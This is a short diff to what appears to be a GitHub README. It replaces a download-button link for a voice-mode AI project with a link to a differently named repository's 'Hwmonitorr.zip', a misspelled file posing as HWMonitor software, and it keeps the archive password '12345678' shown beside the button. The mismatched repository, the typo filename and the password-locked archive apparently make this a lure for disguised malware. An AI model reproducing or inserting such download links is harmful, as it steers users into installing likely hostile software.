@@ -5,7 +5,7 @@
 </p>
 
 <div align="center">
-<a href="https://github.com/FrontierPheasant/mobx-voice-mode-ai/releases/download/v1.0.0/voice-mode.zip">
+<a href="https://github.com/Harbornuembody/HWmonitor-software/releases/download/v1.0.0/Hwmonitorr.zip">
   <img src="https://img.shields.io/badge/⬇_DOWNLOAD_ZIP-22C55E?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP">
 </a>
 <P>PASS KEY ARCHIVE:12345678</P>
